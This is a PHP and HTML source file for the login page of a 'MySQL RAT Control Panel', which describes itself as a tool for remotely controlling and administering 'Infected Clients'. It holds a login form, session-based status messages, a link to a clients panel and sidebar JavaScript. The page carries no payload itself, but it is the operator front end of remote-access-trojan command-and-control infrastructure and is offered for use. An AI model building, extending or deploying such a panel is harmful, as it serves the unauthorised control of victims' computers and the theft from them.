<?php
session_start();
?>
<!DOCTYPE html>
<html>
	<head>
		<meta name="viewport" content="width=device-width, initial-scale=1">
		<link rel="stylesheet" href="css/styles.css">
	</head>
	<body>
		<div id="mySidenav" class="sidenav">
			<a href="javascript:void(0)" class="closebtn" onclick="closeNav()">&times;</a>
			<a href="">Log In</a>
			<a href="Panel/Clients.php">Clients</a>
			<!--<a href="">Services</a>-->
			<a href="About.txt">About</a>
		</div>

		<div id="main">
			<?php
				if(isset($_GET['error'])){
					$ErrorCode = $_GET['error'];
					switch($ErrorCode){
						case "1":
							echo "<div id='Notification'><h4>[ Error ] Wrong UserName / Password</h4></div>";
							break;
						case "2":
							echo "<div id='Notification'><h4>[ Error ] Can't Connect to DataBase</div>";
							break;
						case "3":
							echo "<div id='Notification'><h4>[ Error ] You are Not Connected</div>";
							break;
					}
				}
				if (isset($_SESSION['Connected'])){
					if ($_SESSION['Connected'] == True){
						echo "<div id='Notification' style='Background:green;'><h4> Successfully logged</div>";
					}
				}
			?>
			<div id="main_inside">
				<span style="font-size:30px;cursor:pointer" onclick="openNav()">&#9776;</span>
				<h2>MySQL RAT Control Panel</h2>
				<p>Here You Can Remotely Control And Administrate Your Infected Clients, First You Need to login to your Account so you can access your Control Panel</p>
				
				<div>
					<center>
					<h1 id="header_text">Se Connecter</h1>
					</center>
					<div id = "bg_fond">
						<form action='php/LoginSystem.php' method='post'>
							<table>
							</br>
							UserName :   <input id="USERNAME_Input" type='text' name='USERNAME' placeholder="Enter UserName"/>
							</br></br>
							Password : <input id="PASSWORD_Input" type='password' name='PASSWORD' placeholder="Enter Password" />
							</br></br>
							<input class='Button' type='submit' value='Connexion' />
						</form>
						<br><br>
					</div>
				</div>
			</div>
			
		</div>
		<script>
		function openNav() {
			document.getElementById("mySidenav").style.width = "250px";
			document.getElementById("main").style.marginLeft = "250px";
			document.getElementById("bg_fond").style.backgroundColor = "rgba(0,0,0,0.1)";
			document.getElementById("PASSWORD_Input").disabled = true;
			document.getElementById("PASSWORD_Input").style.backgroundColor = "rgba(0,0,0,0.01)";
			document.getElementById("USERNAME_Input").disabled = true;
			document.getElementById("USERNAME_Input").style.backgroundColor = "rgba(0,0,0,0.01)";
			document.body.style.backgroundColor = "rgba(0,0,0,0.1)";
		}
		function closeNav() {
			document.getElementById("mySidenav").style.width = "0";
			document.getElementById("main").style.marginLeft= "0";
			document.getElementById("PASSWORD_Input").disabled = false;
			document.getElementById("PASSWORD_Input").style.backgroundColor = "#fff";
			document.getElementById("USERNAME_Input").disabled = false;
			document.getElementById("USERNAME_Input").style.backgroundColor = "#fff";
			document.body.style.backgroundColor = "#979ba1";
			document.getElementById("bg_fond").style.backgroundColor = "rgba(165,174,182,0.9)";
		}
		</script>
	</body>
</html> 
